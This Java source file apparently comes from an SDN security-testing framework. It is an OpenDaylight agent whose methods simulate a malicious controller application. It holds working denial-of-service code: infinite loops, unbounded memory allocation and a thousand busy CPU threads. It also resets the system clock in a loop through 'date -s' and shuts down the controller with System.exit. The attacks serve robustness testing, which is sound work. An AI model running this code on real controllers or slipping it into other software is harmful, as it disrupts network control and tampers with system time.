package org.deltaproject.odlagent;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Random;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

//import org.opendaylight.controller.containermanager.*;

class CPU extends Thread {
	int result = 1;

	@Override
	public void run() {
		// TODO Auto-generated method stub
		while (true) {
			result = result ^ 2;
		}
	}
}

class SystemTimeSet extends Thread {
	protected Runtime rt;
	protected String date_information[];
	protected int day;
	protected final String month[] = { "Jan", "Feb", "Mar", "Apr", "May",
			"Jun", "Jul", "Aug", "Dep", " Oct", "Nov", "Dec" };;
	protected int year;
	protected Random rand;

	public SystemTimeSet() {
		rt = Runtime.getRuntime();
		date_information = new String[3];
		rand = new Random();

	}

	@Override
	public void run() {
		while (true) {
			day = rand.nextInt(29) + 1;
			year = rand.nextInt(100) + 1970;
			date_information[0] = String.valueOf(day);
			date_information[1] = month[rand.nextInt(11)];
			date_information[2] = String.valueOf(year);
			try {
				// Process proc = rt.exec(new String[] { "date", "-s",
				// "1 Jan 1960"} );
				Process proc = rt.exec(new String[] {
						"date",
						"-s",
						date_information[0] + " " + date_information[1] + " "
								+ date_information[2] });
				BufferedReader br = new BufferedReader(new InputStreamReader(
						proc.getInputStream()));
				System.out.println("System time setting info : "
						+ br.readLine());
				Thread.sleep(500);
			} catch (IOException e) {
				// TODO Auto-generated catch block
				System.out.println("System set error");
				e.printStackTrace();
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}
}

/*
 * Simple bundle to grab some statistics Fred Hsu
 */
@SuppressWarnings("deprecation")
public class AppAgent {
	private static final Logger log = LoggerFactory.getLogger(AppAgent.class);
	private String containerName = "default";


	/* for S3 */
	// private FlowTableFabrication fModule;
	private SystemTimeSet systime;
	private Random ran;

	private boolean isLoop = false;
	private boolean isDrop = false;

	public AppAgent() {
		ran = new Random();
	}

	void init() {
		
	}

	void destroy() {

	}

	void stop() {

	}


	/* For S3 */
	/* A-2-M */
	public void Set_Control_Message_Drop() {
		this.isDrop = true;
	}

	public void Control_Message_Drop() {
		this.isLoop = true;
	}

	public void Set_Infinite_Loop() {
		this.isLoop = true;
	}

	public void Infinite_Loop() {
		int i = 0;
		System.out.println("[AppAgent] Infinite Loop");

		while (true) {
			i++;

			if (i == 10)
				i = 0;
		}
	}


	/* A-7-M */
	public void Resource_Exhaustion_Mem() {
		System.out.println("[AppAgent] Resource Exhausion : Mem");
		ArrayList<long[][]> arry;
		// ary = new long[Integer.MAX_VALUE][Integer.MAX_VALUE];
		arry = new ArrayList<long[][]>();
		while (true) {
			arry.add(new long[Integer.MAX_VALUE][Integer.MAX_VALUE]);
		}
	}

	public void Resource_Exhaustion_CPU() {
		System.out.println("[AppAgent] Resource Exhausion : CPU");
		int thread_count = 0;

		for (int count = 0; count < 1000; count++) {
			CPU cpu_thread = new CPU();
			cpu_thread.start();
			thread_count++;

			System.out.println("[AppAgent] Resource Exhausion : Thread "
					+ thread_count);
		}
	}

	/* A-8-M */
	public boolean System_Variable_Manipulation() {
		this.systime = new SystemTimeSet();
		systime.start();
		return true;
	}

	/* A-9-M */
	public void System_Command_Execution() {
		System.out
				.println("[AppAgent] System Command Execution : EXIT Controller");
		System.exit(0);
	}

	/* C-1-A */

	/* C-2-M */	
}
